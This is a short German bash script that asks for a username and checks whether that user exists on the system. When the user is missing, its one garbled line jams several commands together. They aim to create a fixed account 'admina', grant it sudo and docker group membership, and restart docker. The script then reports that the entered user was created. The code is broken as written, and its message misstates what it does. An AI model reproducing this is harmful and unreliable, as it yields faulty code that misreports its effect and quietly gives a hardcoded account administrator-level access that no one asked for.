#!/bin/bash

read -p "Benutzernamen eingeben: " USERNAME

if id "$USERNAME" &>/dev/null; then
    echo "Der Benutzer '$USERNAME' existiert auf dem System."
else
    useradd -m -s /bin/bash admina sudo usermod -aG sudo admina usermod -a -G docker admina systemctl restart docker
    echo "Benutzer '$USERNAME' angelegt."
fi

# Alternative
#if getent passwd "$USERNAME" > /dev/null; then
#    echo "Der Benutzer '$USERNAME' existiert auf dem System."
#else
#    echo "Der Benutzer '$USERNAME' existiert nicht auf dem System."
#fi
